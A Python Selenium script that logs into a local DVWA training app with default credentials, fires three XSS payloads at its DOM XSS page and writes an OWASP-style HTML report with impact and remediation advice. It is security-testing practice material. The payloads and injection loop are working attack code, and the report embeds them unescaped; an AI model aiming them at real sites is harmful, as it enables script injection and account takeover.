

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import os
from datetime import datetime

# --- Configuration ---
DVWA_URL = "http://localhost/dvwa/"
LOGIN_URL = DVWA_URL + "login.php"
TARGET_URL = DVWA_URL + "vulnerabilities/xss_d/?default=English"
USERNAME = "admin"
PASSWORD = "password"
RESULTS_DIR = "results"
REPORT_FILE = "DVWA_DOM_XSS_Report.html"

PAYLOADS = [
    "<script>alert('XSS-SUCCESS-1')</script>",
    "<img src=x onerror=alert('XSS-SUCCESS-2')>",
    "<iframe src=\"javascript:alert('XSS-SUCCESS-3');\">"
]

# --- Main Script ---
def main():
    """
    Main function to run the DOM XSS scanner.
    """
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    driver = webdriver.Chrome()  # Or webdriver.Firefox()
    driver.get(LOGIN_URL)

    # Login
    driver.find_element(By.NAME, "username").send_keys(USERNAME)
    driver.find_element(By.NAME, "password").send_keys(PASSWORD)
    driver.find_element(By.NAME, "Login").click()

    time.sleep(2) # Wait for login to complete

    # Navigate to the target page
    driver.get(TARGET_URL)

    successful_payloads = []

    for i, payload in enumerate(PAYLOADS):
        print(f"Testing payload: {payload}")
        # Construct the URL with the payload
        test_url = f"{TARGET_URL}{payload}"
        driver.get(test_url)

        try:
            # Wait for the alert to appear
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()

            print(f"  [+] Success! Alert text: {alert_text}")

            # Capture screenshot
            screenshot_path = os.path.join(RESULTS_DIR, f"success_{i+1}.png")
            driver.save_screenshot(screenshot_path)

            successful_payloads.append({
                "payload": payload,
                "url": test_url,
                "screenshot": screenshot_path
            })

        except TimeoutException:
            print("  [-] Failed. No alert appeared.")

    driver.quit()

    generate_report(successful_payloads)
    print(f"\nReport generated: {REPORT_FILE}")

def generate_report(successful_payloads):
    """
    Generates an HTML report of the findings.
    """
    report_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status = "Vulnerable" if successful_payloads else "Not Vulnerable"
    severity_color = "red" if successful_payloads else "green"

    # HTML Report Template
    html_template = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>OWASP Web Application Security Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .container {{ max-width: 900px; margin: auto; }}
            .header, .footer {{ text-align: center; margin-bottom: 20px; }}
            .section {{ border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }}
            h1, h2, h3 {{ color: #333; }}
            .severity {{ color: {severity_color}; font-weight: bold; }}
            .code {{ background-color: #f4f4f4; border: 1px solid #ddd; padding: 10px; font-family: monospace; white-space: pre-wrap; }}
            img {{ max-width: 100%; height: auto; border: 1px solid #ddd; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>OWASP Web Application Security Test Report</h1>
                <h2>OTG-CLIENT-001: DOM-Based Cross-Site Scripting on DVWA</h2>
            </div>

            <div class="section">
                <h3>Executive Summary</h3>
                <p><strong>Vulnerability:</strong> DOM-Based Cross-Site Scripting (XSS)</p>
                <p><strong>Severity:</strong> <span class="severity">High</span></p>
                <p><strong>Status:</strong> <span class="severity">{status}</span></p>
                <p>The application was found to be vulnerable to DOM-based Cross-Site Scripting (XSS). This allows an attacker to execute arbitrary scripts in the user's browser, which can lead to session hijacking, data theft, or other malicious activities.</p>
            </div>

            <div class="section">
                <h3>Test Methodology</h3>
                <p>An automated test was performed using Python and Selenium. The process involved logging into the DVWA application, navigating to the 'XSS (DOM)' page, and injecting a series of malicious payloads into the URL fragment. The script then monitored the browser for the execution of JavaScript, confirming the vulnerability.</p>
            </div>

            <div class="section">
                <h3>Findings & Evidence</h3>
                {''.join([
                    f"""
                    <h4>Finding {i+1}</h4>
                    <p><strong>Payload:</strong></p>
                    <div class="code">{p['payload']}</div>
                    <p><strong>Proof of Concept URL:</strong></p>
                    <div class="code">{p['url']}</div>
                    <p><strong>Evidence:</strong></p>
                    <img src="{p['screenshot']}" alt="Screenshot of successful XSS">
                    """
                    for i, p in enumerate(successful_payloads)
                ]) if successful_payloads else "<p>No successful XSS payloads were executed.</p>"}
            </div>

            <div class="section">
                <h3>Vulnerability Description (OWASP Style)</h3>
                <p>DOM-based XSS occurs when client-side scripts write user-provided data directly to the Document Object Model (DOM) without proper sanitization. The source of the data is in the DOM (e.g., URL fragment), and the sink is also in the DOM. This vulnerability allows attackers to inject malicious scripts that will be executed by the victim's browser.</p>
            </div>

            <div class="section">
                <h3>Impact</h3>
                <p>The impact of a successful DOM XSS attack can be severe and includes:</p>
                <ul>
                    <li><strong>Session Hijacking:</strong> Attackers can steal session cookies and impersonate the user.</li>
                    <li><strong>Data Theft:</strong> Sensitive information from the page can be exfiltrated.</li>
                    <li><strong>Phishing Attacks:</strong> Users can be redirected to malicious websites.</li>
                    <li><strong>Website Defacement:</strong> The content of the website can be altered.</li>
                </ul>
            </div>

            <div class="section">
                <h3>Recommendations & Remediation</h3>
                <p>To remediate this vulnerability, the following steps are recommended:</p>
                <ul>
                    <li><strong>Primary Recommendation:</strong> Avoid dynamically writing to the DOM using data from untrusted sources.</li>
                    <li><strong>Safe JavaScript APIs:</strong> If dynamic updates are necessary, use safe APIs like <code>textContent</code> instead of <code>innerHTML</code> to prevent script execution.</li>
                    <li><strong>Client-Side Sanitization:</strong> Implement context-sensitive encoding and sanitization using a trusted library like DOMPurify before writing data to the DOM.</li>
                    <li><strong>Content Security Policy (CSP):</strong> Implement a strong CSP as a defense-in-depth measure to restrict the execution of inline scripts.</li>
                </ul>
                <p><i>Note on DVWA Security Levels:</i></p>
                <p><i><b>Medium:</b> The medium level might require different payloads that are encoded or obfuscated to bypass simple filters. The script would need to be adapted with a wider variety of payloads.</i></p>
                <p><i><b>High:</b> The high level often has more robust filtering. Bypassing it might require more advanced techniques, such as using different DOM properties or events to trigger the XSS.</i></p>
            </div>

            <div class="footer">
                <p>Report generated on {report_date} by Automated Test Agent</p>
            </div>
        </div>
    </body>
    </html>
    """

    with open(REPORT_FILE, "w") as f:
        f.write(html_template)

if __name__ == "__main__":
    main()
